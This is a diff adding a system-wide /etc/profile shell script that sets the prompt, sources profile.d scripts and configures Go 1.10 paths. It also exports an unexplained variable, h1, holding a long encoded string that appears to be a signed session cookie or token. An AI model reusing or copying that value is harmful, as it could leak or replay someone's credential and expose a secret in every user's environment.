@@ -1,0 +1,31 @@
+# /etc/profile: system-wide .profile file for the Bourne shell (sh(1))
+# and Bourne compatible shells (bash(1), ksh(1), ash(1), ...).
+
+if [ "${PS1-}" ]; then
+  if [ "${BASH-}" ] && [ "$BASH" != "/bin/sh" ]; then
+    # The file bash.bashrc already sets the default PS1.
+    # PS1='\h:\w\$ '
+    if [ -f /etc/bash.bashrc ]; then
+      . /etc/bash.bashrc
+    fi
+  else
+    if [ "`id -u`" -eq 0 ]; then
+      PS1='# '
+    else
+      PS1='$ '
+    fi
+  fi
+fi
+
+if [ -d /etc/profile.d ]; then
+  for i in /etc/profile.d/*.sh; do
+    if [ -r $i ]; then
+      . $i
+    fi
+  done
+  unset i
+fi
+export GOPATH=/home/GO_PATH
+export GOROOT=/usr/lib/go-1.10
+export h1=bmxpTldmR0xwVGtENElEYlBxQzlBbHpWWGVvQlpsV2hNNmVyY2lDNGJIaHM3SXErdTNNajh0bllKZzZHMXZEdlhLeUpacnhYVGJOOTBHN0tNd2grcEFNd1NidFVHSmdxSnZ4M0FLYkVvd0ZSbTNCdmRLcTBHRkZsSC9oQi84Nzc3SU5HRVpodHdkZFdzdmxESFRxa3dkUWpCNlB6NGNXa0lmcFRSZ0VLYXdQd3Z2aWxaWXY1M1pCOFI4d2k5U211dGlJNVNYWFlXdEowTkRTOXlVOVdOL1UvKzFVZnFMRi9SMWE0TVFCenQ2a1B4MzE0Zm81Z00reHdjSW1DZjhmTFYwMlJrMFJTSnB4bXZsVVBRMk9qMHF0RUJWYzZnWm1pQzJhbjhHNzFvaERhbTU3RGtiWG50T3dxZG5RSG9OVG8xOUZMQW9PUjBKNHRFdDhUWlZWeE9WT1VUN2NCWGlRWlo4K1RaSTh6akhnZlRiVXQvbGw0OTZ6aUZhWXgrczFpaFNQbGZCWm13RzBabDIxOWFoU2pmSENKQ2h3NzBsM2J5djlZTHI2K2hMcW83UFRyNkZOMGFsRUJTZnl5dGxEL1NhTzI3ZXppd2cvRXc4bWxVN2JaMjQ5SVBWZkh5NDlYVURVaXp5NHFRTElCL0dwd3ZPclp3Nks1Y1poSmJNZnctLWpQL3BSWVNaWEVEUFowRU92U1Z6cEE9PQ%3D%3D--d38d5edadf2b96df6297dfcbe294288396f87dcb
+PATH=$GOROOT/bin:$PATH
